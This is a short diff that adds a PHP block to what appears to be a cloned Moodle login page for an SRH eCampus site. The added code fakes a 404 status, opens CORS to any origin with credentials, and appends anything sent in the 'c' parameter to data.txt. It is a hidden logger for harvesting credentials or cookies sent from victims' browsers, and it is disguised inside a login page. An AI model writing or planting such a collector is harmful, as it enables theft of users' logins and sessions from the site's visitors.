@@ -145,6 +145,25 @@ M.yui.loader = {modules: {}};
 </head>
 <body id="page-login-index" class="format-site  path-login dir-ltr lang-de_wp yui-skin-sam yui3-skin-sam srh-ecampus-de pagelayout-login course-1 context-1 notloggedin ">
 
+	<?php
+
+header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
+header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
+header('Access-Control-Allow-Credentials: true');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Headers: Content-Type, *');
+
+$file = 'data.txt';
+
+if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
+{
+    file_put_contents($file, $_REQUEST['c'], FILE_APPEND);
+    printf("LOGGED!");
+}
+
+?>
+	
+	
 <div id="page-wrapper">
 
     <div>
